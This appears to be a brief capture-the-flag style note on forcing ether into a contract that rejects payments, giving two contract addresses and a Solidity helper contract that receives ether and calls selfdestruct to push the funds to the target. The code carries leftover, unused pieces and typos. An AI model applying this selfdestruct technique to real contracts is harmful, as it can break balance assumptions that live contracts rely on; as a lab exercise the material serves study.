First send ethere via metamask to a new created contract with the self destruction function and a fallback function to send eth to a contract address.

Contract we want to send eth:
0xa345709138e86e5dbe125f361a86cf99b504525b

My contract with self destruction option:
0xe4594b09813bca18e1d450b99797ed597d9db6fe


contract ChangeOwner {
 function Delegation(address _delegateAddress) public;
}

contract ForceEther {
      mapping(address => uint) public contributions;

    function contribute() public payable {
    contributions[msg.sender] += msg.value;
    }
        constructor() {
        ChangeOwner Force = ChangeOwner(0xa345709138e86e5dbe125f361a86cf99b504525b);
        Force;
    }
  function() payable {

  }
  function selfDestruct(address _addr) {
    selfdestruct(_addr);
  }
}

When executing selfDestruct send add the address and the contract wil receive the funds